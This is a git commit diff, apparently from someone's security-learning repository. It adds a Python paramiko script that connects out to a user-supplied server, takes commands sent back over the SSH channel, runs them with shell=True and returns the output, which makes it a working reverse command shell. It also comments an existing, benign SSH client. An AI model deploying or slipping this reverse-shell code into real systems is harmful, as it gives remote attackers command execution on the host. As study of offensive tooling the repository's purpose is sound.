7d9223ef093d5e5bc0252543c59c5d6754a6cb5f
m05ec <m.kaviyany@gmail.com>
2023-12-08 19:31:32 +0100

    Working code

---
+++ Custom_SSH_Client.py
@@ -0,0 +1,39 @@
+# This script is used to make a connection to a server 
+# Execute the commands provided by the server on the clinet machine
+# and return the results to the server. It uses SSH to encrypt the communications
+import paramiko
+import shlex
+import subprocess
+
+def ssh_command(ip, port, user, passwd, command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
+    client.connect(ip, port=port, username=user, password=passwd)
+
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+        print(ssh_session.recv(1024).decode())
+        while True:
+            command = ssh_session.recv(1024)
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                cmd_output = subprocess.check_output(cmd, shell=True)
+                ssh_session.send(cmd_output or 'okay')
+            except Exception as e:
+                ssh_session.send(str(e))
+        client.close()
+    return
+
+if __name__ == '__main__':
+    import getpass
+    user = input('Enter username: ')
+    password = getpass.getpass()
+
+    ip = input('Enter server IP: ')
+    port = input('Enter port: ')
+    ssh_command(ip, port, user, password, 'ClientConnected')
+
--- SSH_Client_For_Win.py
+++ SSH_Client_For_Win.py
@@ -1,3 +1,4 @@
+# SSH clinet for windows systems 
 from sys import stderr
 import paramiko
 
@@ -6,7 +7,7 @@ def ssh_command(ip, port, user, passwd, cmd):
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(ip, port=port, username=user, password=passwd)
 
-    _, stdout, stderr = client.exec_command(cmd)
+    _, stdout, stderr = client.exec_command(cmd) #we dont care about the stdin so we use _ which tells python to drop this value
     output = stdout.readlines() + stderr.readlines()
     if output:
         print('----Output---')
@@ -16,9 +17,9 @@ def ssh_command(ip, port, user, passwd, cmd):
 if __name__ == "__main__":
    import getpass
    user = input('Username: ')
-   password = getpass.getpass()
+   password = getpass.getpass() # this module is a more secure way to get the password if someone is sholder surfing you
 
    ip = input('Enter server IP: ') or '192.168.1.203'
-   port = input('Enter port or <CR>: ') or 2222
+   port = input('Enter port or <CR>: ') or 22
    cmd = input('Enter command or <CR>: ') or 'id'
    ssh_command(ip, port,user, password, cmd)
